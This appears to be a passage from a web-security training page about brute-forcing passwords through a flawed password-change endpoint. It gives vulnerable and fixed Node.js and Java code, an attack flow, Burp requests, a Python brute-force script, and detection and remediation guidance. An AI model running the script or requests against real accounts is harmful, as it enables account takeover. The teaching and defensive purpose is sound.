                                <button class="code-action-btn" onclick="copyCode('nodejs-secure')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-javascript" id="nodejs-secure">// authController.js - SECURE VERSION
const bcrypt = require('bcrypt');
const rateLimit = require('express-rate-limit');
const User = require('../models/User');
const { logSecurityEvent } = require('../utils/security');

// ✅ FIX 1: Rate limiting middleware
<span class="secure-line">const passwordChangeLimit = rateLimit({</span>
<span class="secure-line">    windowMs: 15 * 60 * 1000, // 15 minutes</span>
<span class="secure-line">    max: 5, // 5 attempts per window</span>
<span class="secure-line">    message: { error: 'Too many attempts, please try again later' }</span>
<span class="secure-line">});</span>

// ✅ FIX 2: Require authentication middleware
<span class="secure-line">const requireAuth = (req, res, next) => {</span>
<span class="secure-line">    if (!req.session?.userId) {</span>
<span class="secure-line">        return res.status(401).json({ error: 'Authentication required' });</span>
<span class="secure-line">    }</span>
<span class="secure-line">    next();</span>
<span class="secure-line">};</span>

exports.changePassword = [requireAuth, passwordChangeLimit, async (req, res) => {
    const { currentPassword, newPassword1, newPassword2 } = req.body;
    // ✅ FIX 3: Get username from session, not request body
<span class="secure-line">    const username = req.session.username;</span>

    try {
        // ✅ FIX 4: Validate new passwords BEFORE checking current
<span class="secure-line">        if (newPassword1 !== newPassword2) {</span>
<span class="secure-line">            return res.status(400).json({ error: 'New passwords do not match' });</span>
<span class="secure-line">        }</span>

<span class="secure-line">        if (!isStrongPassword(newPassword1)) {</span>
<span class="secure-line">            return res.status(400).json({ error: 'Password does not meet requirements' });</span>
<span class="secure-line">        }</span>

        const user = await User.findOne({ username });
        const isValid = await bcrypt.compare(currentPassword, user.password);

        // ✅ FIX 5: Generic error message for auth failures
<span class="secure-line">        if (!user || !isValid) {</span>
<span class="secure-line">            await logSecurityEvent('password_change_failed', { username, ip: req.ip });</span>
<span class="secure-line">            return res.status(400).json({ error: 'Password change failed' });</span>
<span class="secure-line">        }</span>

        const hashedPassword = await bcrypt.hash(newPassword1, 12);

        // ✅ FIX 6: Invalidate other sessions
<span class="secure-line">        user.password = hashedPassword;</span>
<span class="secure-line">        user.sessionVersion = (user.sessionVersion || 0) + 1;</span>
<span class="secure-line">        await user.save();</span>

        res.json({ message: 'Password changed successfully' });

    } catch (error) {
        res.status(500).json({ error: 'An error occurred' });
    }
}];</code></pre>
                        </div>
                    </div>

                    <!-- Java Vulnerable Code -->
                    <div class="code-container hidden" id="code-java-vulnerable">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-java"></i>
                                <span>PasswordController.java</span>
                            </div>
                            <div class="code-actions">
                                <button class="code-action-btn" onclick="copyCode('java-vuln')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-java" id="java-vuln">// PasswordController.java - VULNERABLE VERSION
@RestController
@RequestMapping("/api/password")
public class PasswordController {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private PasswordEncoder passwordEncoder;

    @PostMapping("/change")
    public ResponseEntity&lt;?&gt; changePassword(@RequestBody PasswordChangeRequest request) {

        // VULNERABILITY 1: Username from request body, not authentication context
<span class="vuln-line">        String username = request.getUsername();  // ❌ User-controlled!</span>
        String currentPassword = request.getCurrentPassword();
        String newPassword1 = request.getNewPassword1();
        String newPassword2 = request.getNewPassword2();

        Optional&lt;User&gt; userOpt = userRepository.findByUsername(username);

        if (userOpt.isEmpty()) {
            return ResponseEntity.status(404).body(Map.of("error", "User not found"));
        }

        User user = userOpt.get();

        // VULNERABILITY 2: Password validation reveals if password is correct
<span class="vuln-line">        if (!passwordEncoder.matches(currentPassword, user.getPassword())) {</span>
<span class="vuln-line">            // ❌ Attacker knows password is WRONG</span>
<span class="vuln-line">            return ResponseEntity.status(401)</span>
<span class="vuln-line">                .body(Map.of("error", "Current password is incorrect"));</span>
<span class="vuln-line">        }</span>

        // VULNERABILITY 3: Different error confirms password was correct
<span class="vuln-line">        if (!newPassword1.equals(newPassword2)) {</span>
<span class="vuln-line">            // ❌ Attacker now knows password is CORRECT!</span>
<span class="vuln-line">            return ResponseEntity.status(400)</span>
<span class="vuln-line">                .body(Map.of("error", "New passwords do not match"));</span>
<span class="vuln-line">        }</span>

        // VULNERABILITY 4: No rate limiting, no account lockout
        user.setPassword(passwordEncoder.encode(newPassword1));
        userRepository.save(user);

        return ResponseEntity.ok(Map.of("message", "Password changed successfully"));
    }
}</code></pre>
                        </div>
                    </div>

                    <!-- Java Secure Code -->
                    <div class="code-container hidden" id="code-java-secure">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-java"></i>
                                <span>PasswordController.java (Secure)</span>
                            </div>
                            <div class="code-actions">
                                <button class="code-action-btn" onclick="copyCode('java-secure')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-java" id="java-secure">// PasswordController.java - SECURE VERSION
@RestController
@RequestMapping("/api/password")
public class PasswordController {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private PasswordEncoder passwordEncoder;

    @Autowired
    private SecurityEventLogger securityLogger;

    @PostMapping("/change")
<span class="secure-line">    @RateLimited(requests = 5, period = 300)  // ✅ 5 requests per 5 minutes</span>
    public ResponseEntity&lt;?&gt; changePassword(
<span class="secure-line">            @AuthenticationPrincipal UserDetails userDetails,  // ✅ From security context</span>
            @RequestBody @Valid PasswordChangeRequest request) {

        // ✅ FIX 1: Get username from authenticated security context
<span class="secure-line">        String username = userDetails.getUsername();</span>
        String currentPassword = request.getCurrentPassword();
        String newPassword1 = request.getNewPassword1();
        String newPassword2 = request.getNewPassword2();

        // ✅ FIX 2: Validate new passwords FIRST
<span class="secure-line">        if (!newPassword1.equals(newPassword2)) {</span>
<span class="secure-line">            return ResponseEntity.status(400)</span>
<span class="secure-line">                .body(Map.of("error", "New passwords do not match"));</span>
<span class="secure-line">        }</span>

<span class="secure-line">        if (!PasswordValidator.isStrong(newPassword1)) {</span>
<span class="secure-line">            return ResponseEntity.status(400)</span>
<span class="secure-line">                .body(Map.of("error", "Password does not meet security requirements"));</span>
<span class="secure-line">        }</span>

        User user = userRepository.findByUsername(username).orElseThrow();

        // ✅ FIX 3: Generic error message for authentication failure
<span class="secure-line">        if (!passwordEncoder.matches(currentPassword, user.getPassword())) {</span>
<span class="secure-line">            securityLogger.log(SecurityEvent.PASSWORD_CHANGE_FAILED, username);</span>
<span class="secure-line">            return ResponseEntity.status(400)</span>
<span class="secure-line">                .body(Map.of("error", "Password change failed"));</span>
<span class="secure-line">        }</span>

        user.setPassword(passwordEncoder.encode(newPassword1));

        // ✅ FIX 4: Invalidate all other sessions
<span class="secure-line">        user.setSessionVersion(user.getSessionVersion() + 1);</span>
        userRepository.save(user);

<span class="secure-line">        securityLogger.log(SecurityEvent.PASSWORD_CHANGED, username);</span>

        return ResponseEntity.ok(Map.of("message", "Password changed successfully"));
    }
}</code></pre>
                        </div>
                    </div>
                </div>

                <!-- Attack Flow -->
                <div class="attack-flow">
                    <h3><i class="fas fa-route"></i> Attack Flow</h3>
                    <div class="flow-steps">
                        <div class="flow-step">
                            <div class="step-number">1</div>
                            <div class="step-content">
                                <h4>Identify Target User</h4>
                                <p>Attacker identifies a target username (e.g., <code>carlos</code> or <code>administrator</code>) through enumeration or reconnaissance.</p>
                            </div>
                        </div>
                        <div class="flow-step">
                            <div class="step-number">2</div>
                            <div class="step-content">
                                <h4>Capture Password Change Request</h4>
                                <p>Login with own account, navigate to password change, capture the request in Burp Suite. Note the <code>username</code> parameter.</p>
                            </div>
                        </div>
                        <div class="flow-step">
                            <div class="step-number">3</div>
                            <div class="step-content">
                                <h4>Modify Username Parameter</h4>
                                <p>Change the <code>username</code> field to target user. Set <code>new_password1</code> and <code>new_password2</code> to DIFFERENT values intentionally.</p>
                            </div>
                        </div>
                        <div class="flow-step">
                            <div class="step-number">4</div>
                            <div class="step-content">
                                <h4>Brute-Force Password</h4>
                                <p>Send to Intruder, set payload position on <code>current_password</code>. Use password list. Look for response containing <code>"New passwords do not match"</code> - this confirms the correct password!</p>
                            </div>
                        </div>
                        <div class="flow-step">
                            <div class="step-number">5</div>
                            <div class="step-content">
                                <h4>Extract Valid Password</h4>
                                <p>Filter results by response length or grep for "do not match". The password that returns this message is the victim's valid password.</p>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Payloads -->
                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Attack Payloads</h3>

                    <div class="payload-box">
                        <span class="payload-label">Original Request</span>
POST /my-account/change-password HTTP/1.1
Host: vulnerable-website.com
Cookie: session=YOUR_SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

username=wiener&current-password=peter&new-password-1=newpass&new-password-2=newpass
                    </div>

                    <div class="payload-box">
                        <span class="payload-label">Modified Attack Request</span>
POST /my-account/change-password HTTP/1.1
Host: vulnerable-website.com
Cookie: session=YOUR_SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

username=carlos&current-password=§PASSWORD§&new-password-1=a&new-password-2=b
                    </div>

                    <div class="payload-box">
                        <span class="payload-label">Burp Intruder Grep Match</span>
# Grep for successful password identification:
"New passwords do not match"

# This response indicates the current-password is CORRECT
# because it passed authentication and moved to password validation
                    </div>

                    <div class="payload-box">
                        <span class="payload-label">Python Script for Automation</span>
import requests

url = "https://vulnerable-site.com/my-account/change-password"
session = requests.Session()
session.cookies.set('session', 'YOUR_SESSION_COOKIE')

passwords = open('passwords.txt').read().splitlines()

for password in passwords:
    data = {
        'username': 'carlos',
        'current-password': password,
        'new-password-1': 'a',
        'new-password-2': 'b'  # Intentionally different
    }
    response = session.post(url, data=data)

    if 'New passwords do not match' in response.text:
        print(f'[+] Found password: {password}')
        break
    elif 'Current password is incorrect' in response.text:
        print(f'[-] Wrong: {password}')
                    </div>
                </div>

                <!-- Analysis Panel -->
                <div class="analysis-panel">
                    <h3><i class="fas fa-microscope"></i> Vulnerability Analysis</h3>
                    <div class="analysis-grid">
                        <div class="analysis-card">
                            <h4><i class="fas fa-exclamation-circle"></i> Root Cause</h4>
                            <ul>
                                <li>Username parameter accepted from user input instead of server session</li>
                                <li>Sequential validation reveals password status through error message differences</li>
                                <li>No rate limiting on sensitive endpoint</li>
                            </ul>
                        </div>
                        <div class="analysis-card">
                            <h4><i class="fas fa-crosshairs"></i> Attack Vector</h4>
                            <p>Authentication bypass through differential response analysis. Attacker exploits the logical flaw where valid credentials produce different error messages than invalid ones.</p>
                        </div>
                        <div class="analysis-card">
                            <h4><i class="fas fa-bomb"></i> Impact</h4>
                            <ul>
                                <li>Complete account takeover</li>
                                <li>Bypass of authentication controls</li>
                                <li>Privilege escalation if admin accounts targeted</li>
                                <li>CVSS: 8.1 (High)</li>
                            </ul>
                        </div>
                        <div class="analysis-card">
                            <h4><i class="fas fa-search"></i> Detection</h4>
                            <ul>
                                <li>Multiple failed password changes for same user</li>
                                <li>Password change attempts with mismatched new passwords</li>
                                <li>Username in request differs from session user</li>
                            </ul>
                        </div>
                    </div>
                </div>

                <!-- Real World Examples -->
                <div class="realworld-section">
                    <h3><i class="fas fa-globe"></i> Real-World Occurrences</h3>

                    <div class="realworld-case">
                        <h4>HackerOne Report #1552047 - Password Reset Account Takeover</h4>
                        <p>Similar vulnerability in a major fintech platform allowed attackers to brute-force passwords through the password reset flow. The error messages differed based on whether the security questions were answered correctly.</p>
                        <span class="bounty">$5,000 Bounty</span>
                    </div>

                    <div class="realworld-case">
                        <h4>CVE-2019-12742 - Zoho ManageEngine</h4>
                        <p>The password change functionality in Zoho ManageEngine allowed remote attackers to change any user's password without authentication due to improper access control on the username parameter.</p>
                        <span class="bounty">CVSS 9.8 Critical</span>
                    </div>

                    <div class="realworld-case">
                        <h4>Authentication Bypass in Enterprise HR System</h4>
                        <p>A Fortune 500 company's HR portal allowed password brute-forcing through the "update password" feature. Different error codes (401 vs 400) revealed whether the current password was valid.</p>
                        <span class="bounty">$15,000 Bounty</span>
                    </div>
                </div>

                <!-- Remediation -->
                <div class="remediation-section">
                    <h3><i class="fas fa-shield-alt"></i> Remediation Checklist</h3>
                    <div class="remediation-list">
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Use Session-Based Identity:</strong> Always get the username from the server-side session, never from user-supplied parameters.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Generic Error Messages:</strong> Return the same error message regardless of whether the current password is correct or incorrect.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Validate New Passwords First:</strong> Check if new passwords match and meet requirements before validating the current password.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Implement Rate Limiting:</strong> Limit password change attempts to 3-5 per 15 minutes with exponential backoff.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Account Lockout:</strong> Temporarily lock the account after multiple failed password change attempts.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Security Logging:</strong> Log all password change attempts with IP, timestamp, and success/failure status for security monitoring.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Session Invalidation:</strong> Invalidate all other sessions after a successful password change to prevent session hijacking.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Re-authentication:</strong> Require recent authentication (within last 5 minutes) before allowing password changes.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
    <script>
        // Current state
        let currentLang = 'python';
        let currentView = 'vulnerable';

        // Language tab handling
        document.querySelectorAll('.lang-tab').forEach(tab => {
            tab.addEventListener('click', () => {
                document.querySelectorAll('.lang-tab').forEach(t => t.classList.remove('active'));
                tab.classList.add('active');
                currentLang = tab.dataset.lang;
                updateCodeDisplay();
            });
        });

        // View tab handling (vulnerable/secure)
        document.querySelectorAll('.code-tab').forEach(tab => {
            tab.addEventListener('click', () => {
                document.querySelectorAll('.code-tab').forEach(t => t.classList.remove('active'));
                tab.classList.add('active');
                currentView = tab.dataset.view;
                updateCodeDisplay();
            });
        });

        // Update code display based on current language and view
        function updateCodeDisplay() {
            document.querySelectorAll('.code-container').forEach(container => {
                container.classList.add('hidden');
            });

            const containerId = `code-${currentLang}-${currentView}`;
            const container = document.getElementById(containerId);
            if (container) {
                container.classList.remove('hidden');
            }
        }

        // Lab item selection
        document.querySelectorAll('.lab-item:not(.coming-soon)').forEach(item => {
            item.addEventListener('click', () => {
                document.querySelectorAll('.lab-item').forEach(i => i.classList.remove('active'));
                item.classList.add('active');

                // Show corresponding content
                const labId = item.dataset.lab;
                document.querySelectorAll('.lab-content').forEach(content => {
                    content.classList.add('hidden');
                });
                const labContent = document.getElementById(labId);
                if (labContent) {
                    labContent.classList.remove('hidden');
                }
            });
        });

        // Copy code functionality
        function copyCode(codeId) {
            const codeElement = document.getElementById(codeId);
            const text = codeElement.innerText;
            navigator.clipboard.writeText(text).then(() => {
                // Show feedback
                const btn = event.target.closest('.code-action-btn');
                const originalText = btn.innerHTML;
                btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
                setTimeout(() => {
                    btn.innerHTML = originalText;
                }, 2000);
            });
        }

        // Initialize
        updateCodeDisplay();
    </script>
</body>
</html>
